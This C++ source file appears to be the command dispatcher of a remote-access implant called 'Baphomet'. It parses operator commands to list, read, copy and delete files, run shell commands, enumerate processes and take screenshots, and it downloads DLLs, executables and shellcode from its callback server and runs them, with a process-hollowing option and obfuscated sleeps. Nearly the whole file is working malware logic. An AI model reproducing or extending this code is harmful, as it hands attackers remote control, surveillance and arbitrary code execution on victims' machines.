//
// Created by diago on 2024-06-06.
//

#include <main.hpp>

std::string
format_output(const std::string& str) {
    return std::string("\"\n") + (str + '\"');
}


command_output
process_command(
        _In_ const std::string& command_str,
        _In_ const char delimeter,
        _In_ const implant_context& ctx
    ) {

    std::vector<std::string> args;
    size_t start            = 0;
    size_t next_delimeter   = command_str.find(delimeter);

    while(next_delimeter != std::string::npos) {
        if(next_delimeter > start) {
            args.push_back(command_str.substr(start, next_delimeter - start));
        }

        start = next_delimeter + 1;
        next_delimeter = command_str.find(delimeter, start);
    }

    if(args.empty()) {
        return { format_output("Invalid command."), nullptr, output_type::PLAIN_TEXT };
    }


#ifdef BAPHOMET_DEBUG
    std::cout << "[+] Command chunks:" << std::endl;
    for(size_t i = 0; i < args.size(); i++) {
        std::cout << " - " << args[i] << std::endl;
    }
#endif

    //
    // gonna just stick with the simplest way of doing this, no std::map or anything.
    // takes up more LOC, but less things to statically link, so smaller payload size.
    //

    const std::string cmd_name = args[0];


    if(cmd_name == "pwd") {
        return { format_output(tasking::pwd()), nullptr, output_type::PLAIN_TEXT };
    } if(cmd_name == "cd") {
        return { format_output(tasking::cd(args[1])), nullptr, output_type::PLAIN_TEXT };
    } if (cmd_name == "ls") {
        return { format_output(tasking::ls()), nullptr, output_type::PLAIN_TEXT };
    } if (cmd_name == "cat") {
        return { format_output(tasking::cat(args[1])), nullptr, output_type::PLAIN_TEXT };
    } if (cmd_name == "whoami") {
        return { format_output(recon::whoami()), nullptr, output_type::PLAIN_TEXT };
    } if (cmd_name == "rm") {
        return { format_output(tasking::rm(args[1])), nullptr, output_type::PLAIN_TEXT };
    } if (cmd_name == "mkdir") {
        return { format_output(tasking::mkdir(args[1])), nullptr, output_type::PLAIN_TEXT };
    } if (cmd_name == "cp") {
        return { format_output(tasking::cp(args[1], args[2])), nullptr, output_type::PLAIN_TEXT };
    } if (cmd_name == "ps") {
        return { format_output(tasking::shell_command(args[1], true)), nullptr, output_type::PLAIN_TEXT };
    } if (cmd_name == "cmd") {
        return { format_output(tasking::shell_command(args[1], false)), nullptr, output_type::PLAIN_TEXT };
    } if(cmd_name == "die") {
        return { format_output("Exiting..."), nullptr, output_type::PLAIN_TEXT };
    }


    if (cmd_name == "procenum") {
        std::string procs = recon::enumerate_processes();

        if(procs.size() > 15000) {
            HANDLE hprocs = tasking::write_into_file(procs, "pr.txt", procs.size(), true);
            if(hprocs == nullptr) {
                return {"Failed to create output file for process report.", nullptr, output_type::PLAIN_TEXT};
            }
            return {"", hprocs, output_type::FILE};
        }

        return { procs, nullptr, output_type::PLAIN_TEXT };
    }


    if (cmd_name == "screenshot") {
        HANDLE hscreenshot = recon::save_screenshot();
        if(hscreenshot == nullptr) {
            return {"Failed to save screenshot.", nullptr, output_type::PLAIN_TEXT };
        }

        return {"", hscreenshot, output_type::FILE};
    }


    if(cmd_name == "rundll") {
        obfus::sleep(ctx.sleep_time);
        std::string dll_file;

        if(!networking::http::recieve_file(
            ctx.hconnect,
            ctx.callback_object,
            args[1],
            ctx.session_token,
            ctx.is_https,
            dll_file
        )) {
            return {
                format_output("Failed to download specified DLL: " + args[1]),
                nullptr,
                output_type::PLAIN_TEXT
            };
        }

        return {
            format_output(tasking::rundll(dll_file)),
            nullptr,
            output_type::PLAIN_TEXT
        };
    }


    if(cmd_name == "runexe") {
        obfus::sleep(ctx.sleep_time);
        std::string exe_file;

        if(!networking::http::recieve_file(
            ctx.hconnect,
            ctx.callback_object,
            args[1],
            ctx.session_token,
            ctx.is_https,
            exe_file
        )) {
            return {
                format_output("Failed to download specified executable: " + args[1]),
                nullptr,
                output_type::PLAIN_TEXT
            };
        }

        return {
            format_output(tasking::runexe(args[2] == "hollow", exe_file)),
            nullptr,
            output_type::PLAIN_TEXT
        };
    }


    if(cmd_name == "runshellcode") {
        obfus::sleep(ctx.sleep_time);
        std::string shellcode_buff;

        if(!networking::http::recieve_file(
            ctx.hconnect,
            ctx.callback_object,
            args[1],
            ctx.session_token,
            ctx.is_https,
            shellcode_buff
        )) {
            return {
                format_output("Failed to download shellcode: " + args[1]),
                nullptr,
                output_type::PLAIN_TEXT
            };
        }

        return {
            format_output(tasking::run_shellcode(GetCurrentProcessId(), false, false, shellcode_buff)),
            nullptr,
            output_type::PLAIN_TEXT
        };
    }

    if(cmd_name == "runbof") {
        return { format_output("unimplimented"), nullptr, output_type::PLAIN_TEXT };
    }

    return { format_output("Unknown command."), nullptr, output_type::PLAIN_TEXT };
}